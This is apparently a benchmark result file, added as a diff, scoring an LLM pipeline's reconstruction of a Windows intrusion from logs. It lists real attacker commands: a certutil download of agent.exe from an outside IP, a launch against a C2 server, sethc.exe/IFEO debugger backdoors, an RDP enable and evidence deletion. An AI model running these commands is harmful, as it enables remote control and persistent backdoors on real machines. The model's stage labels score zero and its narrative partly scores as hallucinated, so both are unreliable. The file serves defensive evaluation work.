@@ -1,0 +1,148 @@
+{
+  "output": {
+    "malicious_events": [
+      {
+        "command": "certutil -urlcache -split -f http://124.223.85.207:8079/sangforcat.exe C:\\Users\\Public\\agent.exe",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "certutil -urlcache -split -f http://124.223.85.207:8079/sangforcat.exe C:\\Users\\Public\\agent.exe",
+        "stage": "Persistence"
+      },
+      {
+        "command": "start /min C:\\Users\\Public\\agent.exe -opid 7fa51253-c053-4b44-94eb-5d8a161b429b -server https://124.223.85.207:8443",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "del /f /q PhpStudyPoc.py",
+        "stage": "Collection"
+      },
+      {
+        "command": "del /f /q PhpStudyExp2.py",
+        "stage": "Collection"
+      },
+      {
+        "command": "del /f /q WinBrute.exe",
+        "stage": "Collection"
+      },
+      {
+        "command": "del /f /q nbtscan.exe",
+        "stage": "Collection"
+      },
+      {
+        "command": "del /f /q PAExec.exe",
+        "stage": "Collection"
+      },
+      {
+        "command": "reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f",
+        "stage": "Privilege Escalation"
+      },
+      {
+        "command": "reg add \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe\" /v Debugger /t REG_SZ /d \"C:\\windows\\system32\\cmd.exe\"",
+        "stage": "Privilege Escalation"
+      },
+      {
+        "command": "reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe\" /v Debugger /t REG_SZ /d C:\\windows\\system32\\cmd.exe /f",
+        "stage": "Privilege Escalation"
+      },
+      {
+        "command": "reg add \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe\" /v Debugger /t REG_SZ /d \\\"C:\\windows\\system32\\sethc.exe\\\"",
+        "stage": "Privilege Escalation"
+      },
+      {
+        "command": "reg add HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe /v Debugger /t REG_SZ /d C:\\windows\\system32\\sethc.exe /f",
+        "stage": "Privilege Escalation"
+      },
+      {
+        "command": "reg delete HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe /v Debugger /f",
+        "stage": "Privilege Escalation"
+      },
+      {
+        "command": "reg delete HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe /v Debugger /f",
+        "stage": "Privilege Escalation"
+      },
+      {
+        "command": "reg add HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\csrss.exe /v Debugger /t REG_SZ /d C:\\windows\\system32\\cmd.exe /f",
+        "stage": "Privilege Escalation"
+      },
+      {
+        "command": "reg add HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\csrss.exe /v Debugger /t REG_SZ /d C:\\windows\\system32\\cmd.exe",
+        "stage": "Privilege Escalation"
+      },
+      {
+        "command": "reg delete HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\csrss.exe /v Debugger /f",
+        "stage": "Privilege Escalation"
+      },
+      {
+        "command": "reg add HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\csrss.exe /v Debugger /t REG_SZ /d C:\\windows\\system32\\cmd.exe /f",
+        "stage": "Privilege Escalation"
+      },
+      {
+        "command": "reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\winlogon.exe\" /v Debugger /t REG_SZ /d C:\\windows\\system32\\cmd.exe",
+        "stage": "Privilege Escalation"
+      },
+      {
+        "command": "reg add HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\ntkrnlpa.exe /v Debugger /t REG_SZ /d C:\\windows\\system32\\cmd.exe",
+        "stage": "Privilege Escalation"
+      },
+      {
+        "command": "reg add HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\ntoskrnl.exe /v Debugger /t REG_SZ /d C:\\windows\\system32\\cmd.exe",
+        "stage": "Privilege Escalation"
+      },
+      {
+        "command": "reg add HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\win32k.sys /v Debugger /t REG_SZ /d C:\\windows\\system32\\cmd.exe",
+        "stage": "Privilege Escalation"
+      },
+      {
+        "command": "reg add HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\win32k.sys /v Debugger /t REG_SZ /d C:\\windows\\system32\\cmd.exe /f",
+        "stage": "Privilege Escalation"
+      },
+      {
+        "command": "reg add HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\win32kbase.sys /v Debugger /t REG_SZ /d C:\\windows\\system32\\cmd.exe",
+        "stage": "Privilege Escalation"
+      },
+      {
+        "command": "reg add HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\win32kfull.sys /v Debugger /t REG_SZ /d C:\\windows\\system32\\cmd.exe",
+        "stage": "Privilege Escalation"
+      }
+    ],
+    "narrative": "The attacker initiated the compromise using an exploit delivered via a webpage. The exploit downloaded a remote access tool (RAT) called 'agent.exe' onto the victim machine. After establishing persistence through modification of the registry and creation of new users accounts, the attacker used PowerShell scripts to disable security features like Windows Defender and Firewall, as well as modified group policies to enable RDP and Remote Desktop Services on port 3389. Additionally, they installed various malware tools such as NetBIOS Scanner, NBTScan, and System Information Gatherer. Throughout their activities, the attackers leveraged multiple DLL hijacking techniques involving legitimate applications like Notepad, Python, and Java.",
+    "_parse_ok": true,
+    "_cost": {
+      "llm_calls": 4,
+      "prompt_tokens": 67977,
+      "completion_tokens": 2632,
+      "total_tokens": 70609,
+      "wall_clock_s": 31.482,
+      "parse_retries": 0
+    }
+  },
+  "score": {
+    "event": {
+      "precision": 0.38461538461538464,
+      "recall": 0.8333333333333334,
+      "f1": 0.5263157894736842,
+      "tp": 10,
+      "fp": 16,
+      "fn": 2
+    },
+    "stage": {
+      "precision": 0.0,
+      "recall": 0.0,
+      "f1": 0.0,
+      "tp": 0,
+      "fp": 26,
+      "fn": 6,
+      "recall_partial": 0.3333333333333333
+    },
+    "hallucination_rate": 0.29411764705882354,
+    "cost": {
+      "llm_calls": 4,
+      "prompt_tokens": 67977,
+      "completion_tokens": 2632,
+      "total_tokens": 70609,
+      "wall_clock_s": 31.482,
+      "parse_retries": 0
+    }
+  }
+}
